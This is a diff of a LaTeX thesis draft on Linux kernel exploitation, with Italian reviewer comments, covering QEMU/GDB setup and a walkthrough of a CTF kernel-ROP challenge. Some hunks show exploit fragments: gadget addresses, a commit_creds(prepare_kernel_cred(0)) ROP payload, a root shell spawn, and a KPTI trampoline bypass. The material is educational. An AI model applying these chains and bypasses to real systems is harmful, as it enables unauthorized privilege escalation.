@@ -68,12 +68,12 @@ We start our research about \emph{kernel exploitation} with an clear purpose: ex
 When we talk about a computer, we generally think of a set of physical devices (processor, motherboard, memory, hard drive, keyboard, etc.) that let us  perform simple tasks such as writing, sending an e-mail, watching a movie, surfing the Web and so on.
 The kernel has complete control over everything in the system. It is the \emph{portion of the operating system code} that is always resident in memory, and facilitates interactions between hardware and software components.
 Typically the kernel is responsible for memory management, process and task management and disk management.
-Between these bits of hardware and applications we work on every day there's a layer of software that makes it possible all the hardware work efficiently and create an infrastructure which the applications can work.
+Between these bits of hardware and applications we work on every day there is a layer of software that makes it possible all the hardware work efficiently and create an infrastructure which the applications can work.
 This layer of software is the operating system, and its core is the kernel.
 
 In modern operating systems, the kernel acts for the things we normally assume: virtual memory, hard-drive access, input/output handling, and so forth. Generally larger than most user applications, the kernel is a complex and charming piece of code usually written in a collection of assembly, the low level machine language, and C.
 Moreover, the kernel employs some underlying architecture properties to separate itself from the rest of the running programs.
-In fact, most \emph{Instruction Set Architectures} (ISA) supply at least two modes of execution: a \emph{privileged mode}, where the machine-level instructions are completely accessible, and an \emph{unprivileged/user mode}, in which only a subset of instructions are accessible.
+In fact, most \emph{Instruction Set Architectures} (ISA)~\cite{silberman1993architectural} supply at least two modes of execution: a \emph{privileged mode}, where the machine-level instructions are completely accessible, and an \emph{unprivileged/user mode}, in which only a subset of instructions are accessible.
 Furthermore, the kernel protects itself from user applications by realizing separation at the software level.
 When we have to set up the virtual memory subsystem, the kernel makes it possible to access the address space (i.e., the range of virtual memory addresses) of any process, and no process can directly refer to the kernel memory.
 
@@ -98,7 +98,7 @@ Analyzing an application to establish its vulnerability is called \emph{auditing
 \label{sect:land}
 
 Until now the kernel has been described as the entity through which many countermeasures against exploitation are realized.\glnote{???}
-\vtnote{non sapevo come introdurre il capitolo}
+\vtnote{non sapevo come introdurre il capitolo. Probabilmente potrei eliminare quella prima frase}
 With the large diffusion of security patches and the contemporary reduction of user-land vulnerabilities, the attention of exploits writers has gone toward the core of the operating system.
 However, writing a \emph{kernel-land exploit} presents various extra challenges if compared to a user-land exploit:
 \begin{itemize}
@@ -108,7 +108,7 @@ When it comes to the kernel, this hypothesis is not\glnote{nel linguaggio formal
  If the error happens inside one of the sensible areas of the kernel, the operating system will just shut down, a condition known as panic.
 \item The kernel is protected from user-land via both software and hardware. Finding information about the kernel is a much more difficult job. At the same time, the number of variables that are no more under the attacker’s control intensifies in an exponentially way. For example, let's consider the \emph{memory allocator}.
 In a user-land exploit, the allocator is inside \emph{the process}, generally connected through a shared system library. Your purpose is its only consumer and its only \emph{affecter}\glnote{non capisco la frase}\vtnote{Per questa sezione ho preso spunto da "a guide to kernel exploit"...}. On the other side, all the processes on the system may concern the behavior and the status of a kernel memory allocator.
-\item The kernel is a large and complex system. The dimension of the kernel is substantive, maybe on the order of millions of lines of source code\glnote{metti il numero di linee del kernel attuale; forse ci potrebbe stare bene anche un grafico di come è cresciuto negli anni, se si trova (mi sembra di aver visto qualcosa in giro)}. 
+\item The kernel is a large and complex system. The dimension of the kernel is substantive, on the order of millions of lines of source code\glnote{metti il numero di linee del kernel attuale; forse ci potrebbe stare bene anche un grafico di come è cresciuto negli anni, se si trova (mi sembra di aver visto qualcosa in giro)}:
 \begin{figure}[h!]
    \makebox[\textwidth][c]{\includegraphics{images/linux-lines-code.png}}
    \caption{Growth of Codebase Kernel Linux}
@@ -128,7 +128,7 @@ vulnerability. This characteristic can also become an advantage for the exploit 
 \label{sect:debugging}
 
 In user space we had the support of the kernel so we could easily stop processes and use gdb to inspect their behavior.
-GDB(collegamento wiki)\glnote{collegamento wiki??? se vuoi mettere un collegamento, metti la pagina ufficiale di gdb}\vtnote{collegamento wiki intendo i riferimenti che devo fare con bibitex o a siti :D} allows you to see what is going on \emph{inside} another program while it executes -- or what another program was doing at the moment it crashed.
+GDB~\cite{stallman1988debugging})\glnote{collegamento wiki??? se vuoi mettere un collegamento, metti la pagina ufficiale di gdb}\vtnote{collegamento wiki intendo i riferimenti che devo fare con bibitex o a siti :D} allows you to see what is going on \emph{inside} another program while it executes -- or what another program was doing at the moment it crashed.
 \subsection{GDB}
 \label{subsect:gdb}
 GDB can do four main kinds of things to help you catch bugs in the act:
@@ -138,14 +138,22 @@ GDB can do four main kinds of things to help you catch bugs in the act:
 \item Examine what has happened, when your program has stopped.
 \item Change things in your program, so you can experiment with correcting the effects of one bug and go on to learn about another.
 \end{itemize}
-\glnote{tutto quello che segue è molto confusionario; per esempio, se usi gdb come front-end, chi è il kernel-debugger?} Using gdb as a front-end for the kernel debugger allows us to debug the kernel in the familiar and powerful debugging interface of gdb.
-\glnote{Gira la frase: per poter debuggare un kernel, dobbiamo ricorrere a un hypervisor.... in realtà credo che tu possa anche usare un collegamento seriale e un altro PC; andrebbe detto (poi è scomodo e si usa QEMU, ovviamente} In the kernel, in order to use gdb we need to use hypervisor like QEMU based hardware interfaces which are not always available.
+\glnote{tutto quello che segue è molto confusionario; per esempio, se usi gdb come front-end, chi è il kernel-debugger?} Using gdb allows us to debug the kernel in the familiar and powerful debugging interface of gdb.
+\glnote{Gira la frase: per poter debuggare un kernel, dobbiamo ricorrere a un hypervisor.... in realtà credo che tu possa anche usare un collegamento seriale e un altro PC; andrebbe detto (poi è scomodo e si usa QEMU, ovviamente}
+In order to debug a kernel we have two options:
+\begin{itemize}
+\item A serial connection and another pc;
+\item Use a Hypervisor.
+\end{itemize}
+Given the lack of convenience of the first option, a hypervisor is preferred.
+Among them we have \emph{QEMU} ~\cite{bellard2005qemu}, a hosted hypervisor, that is, running within a traditional operating system, just like any other program.
+In the kernel, in order to use gdb we need to use hypervisor like QEMU based hardware interfaces which are not always available.
 The Linux kernel provides a set of tools and debug options useful for investigating abnormal behavior.
 
 \subsection{Running QEMU}
 \label{subsect:QEMU}
 As said previously, to debug the kernel we need the qemu hypervisor. Specifically, there are some options needed in kernel analysis:\glnote{usa un itemize per fare elenco puntato; alcune opzioni non mi sembra che siano per l'analisi, ma semplicemente per far partire un sistema linux sotto qemu}
-\vtnote{potrei dire....there are some options we need to run an operating system and analyze the kernel:}
+\vtnote{potrei dire....There are some options we need to run an operating system and analyze the kernel:}
 
 \begin{itemize}
 \item -kernel <path>, (where <path> means the) Path to kernel image to debug;
@@ -153,7 +161,7 @@ As said previously, to debug the kernel we need the qemu hypervisor. Specificall
 \item -gdb dev , wait for gdb connection on device dev. Typical connections will likely be TCP-based, but also UDP, pseudo TTY, or even stdio are reasonable use case;
 \item -s, shorthand for -gdb tcp::1234, i.e. open a gdbserver on TCP port 1234;
 \item -S, freeze the CPU on startup;
-\item -cpu model, select CPU model. Here we can add +smep and +smap for SMEP and SMAP mitigation features;
+\item -cpu model, select CPU model. Here we can add +smep and +smap for \emph{SMEP} and \emph{SMAP} mitigation features;
 \item -m [size=]megs, set virtual RAM size to megs megabytes;
 \item -append, specifies additional boot options. This is also where we can enable/disable mitigation features.
 \end{itemize}
@@ -196,7 +204,7 @@ CONFIG_KALLSYMS causes kernel symbol information to be built into the kernel; it
 CONFIG_IKCONFIG and CONFIG_IKCONFIG_PROC (found in the "General setup" menu) cause the full kernel configuration state to be built into the kernel and to be made available via /proc. Most kernel developers know which configuration they used and do not need these options (which make the kernel bigger). They can be useful, though, if you are trying to debug a problem in a kernel built by somebody else.
 \end{lstlisting}
 
-If you don’t want to use menuconfig is possible to set configuration options via command line using the following
+If you do not want to use menuconfig is possible to set configuration options via command line using the following
 \lstinline{$ ./scripts/config -e CONFIG_<your option>} .\\
 Once you have enabled all these options, you need to build the kernel.
 This is done from the command line:\\
@@ -262,12 +270,12 @@ Finer grained ASLR has been proposed as a way to make ASLR more resistantto info
 
 \chapter{Intensification of mitigation features}
 \label{ch:adding mitigation}
-In this chapter, I'll show how mitigations make it harder to exploit root privileges.
+In this chapter, I will show how mitigations make it harder to exploit root privileges.
 In particular, I will explore the resolution of a \emph{CTF} (wiki CTF https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/), starting from an environment without mitigations up to adding all the mitigations to solve the real CTF.
 To do this I will use a technique called \emph{ROP}(wiki) with a module having an extremely trivial and standard bug.
 \section{Setup environment}
 Our task is to exploit a vulnearable custom kernel module that is installed into the kernel on boot.
-I'll use the setup seen for the kernel in the section (dire la sezione del setup kernel) and the one for qemu (esplicitare sezione di qemu).
+I will use the setup seen for the kernel in the section (dire la sezione del setup kernel) and the one for qemu (esplicitare sezione di qemu).
 Since it is a CTF, where it is usual to use a flag to prove that you are getting the admin mode, you need to add some options in the qemu setup.
 To do this, the command is also added to the qemu settings:
 \lstinline{-hdb flag.txt}
@@ -322,7 +330,7 @@ The idea is to put the piece of code which we want the program’s flow to jump 
 For this technique to work, we will remove most of the mitigation features in the qemu run the script by removing +smep, +smap, kpti=1, kaslr, and adding nopti, nokaslr.
 \subsection{Step by step to exploit}
 First of all let's open the hackme function with the \emph{open} method. It returns a file descriptor which will be used later in the next steps.
-Using a \emph{read} function, we're going to read the stack.
+Using a \emph{read} function, we are going to read the stack.
 The \emph{buffer} in the stack itself is 0x80 bytes long and the stack cookie is immediately after it. Therefore, if we read the data in an unsigned long array (of which each element is 8 bytes), the cookie will be at offset 16.
 To overwrite the return address, the same procedure is carried out for leaking, overwriting the cookie with ours. Note, however, that after the cookie there are 3 registers \emph{rbx, r12, and rbp} (different in the userland because the only rbp appears).
 This involves inserting three dummy values after our cookie and inserting the return address we want our program to return to, which corresponds to the function we will create in the user area to get root privileges.
@@ -422,7 +430,7 @@ unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax; jn
 They might sound a little bizarre, but all the ordinary gadgets tried are not executable.
 This is not always the case, it depends on the kernel in use, in fact very important at this stage is to try all possible solutions.
 The above code, entering 8 in rdx ignores the jne instruction, allows you to write the rax value in rdi that will be used for the commit_creds function (prepare_kernel_cred (0))
-While ROPgadget can find swapgs, it doesn't find iretq, so we use objdump to find the right address and be able to write the full ROP chain.
+While ROPgadget can find swapgs, it does not find iretq, so we use objdump to find the right address and be able to write the full ROP chain.
 \begin{lstlisting}
 void get_shell(void){
     puts("[*] Returned to userland");
@@ -430,7 +438,7 @@ void get_shell(void){
         printf("[*] UID: %d, got root!\n", getuid());
         system("/bin/sh");
     } else {
-        printf("[!] UID: %d, didn't get root\n", getuid());
+        printf("[!] UID: %d, did not get root\n", getuid());
         exit(-1);
     }
 }
@@ -458,7 +466,7 @@ void overflow(void){
     payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
     payload[off++] = pop_rdx_ret;
     payload[off++] = 0x8; // rdx <- 8
-    payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch
+    payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE does not branch
     payload[off++] = 0x0; // dummy rbx
     payload[off++] = 0x0; // dummy rbp
     payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
@@ -476,7 +484,7 @@ void overflow(void){
 \section{Adding KPTI}
 \label{sect:trampoline}
 As mentioned in the paragraph (quote the part with ktpi) the user-space and kernel-space page tables are separate. In fact, in user mode, a page set includes user-space page tables and only a few kernel-space addresses.
-There are several ways to bypass this mitigation, but the one we're going to look at is called a \emph{trampoline}.
+There are several ways to bypass this mitigation, but the one we are going to look at is called a \emph{trampoline}.
 Logically if a system call returns normally there must be a piece of code in the kernel that swaps the page tables to the userland, so we will try to reuse that code for our purpose.
 This piece of code is called a trampoline and swaps the page tables, swapgs, and iretq.
 \section{Tweaking the ROP chain}
@@ -521,8 +529,19 @@ void overflow(void){
 This solution can be used regardless of whether KPTI is enabled or not.
 So, even if different from the one seen in the paragraph (subsection {Second scenario}), it can be used to bypass the SMEP.
 \section{Adding SMAP}
+This feature marks all the userland pages in the page table as non-accessible when the process is in kernel-mode, which means they cannot be read or written.
+In the kernel, this is enabled by setting the 21st bit of Control Register CR4.
 
+The situation becomes significantly different for the two scenarios:
+
+In the first scenario, our whole ROP chain is stored on the kernel stack, and no data are accessed from the userland. Therefore, our previous payload would still be viable without any modification.
+However in the second scenario, recall that we actually pivot the stack into a page in the userland. Operations like push and pop the stack require read and write access to it, and SMAP prevents that from happening. As a result, the stack pivoting payload would no longer be viable. In fact, as far as I know, our current read and write primitives from the stack is not enough to produce a successful exploit, we would need a far stronger primitive to exploit the kernel module in this case, which may involve knowledge of the page tables and page directory, or some other advanced topics.
+
+da capire
 \section{Adding KASLR and FG-KASLR}
+
+\bibliographystyle{alphaurl}
+\bibliography{bib}
 \end{document}
 
 
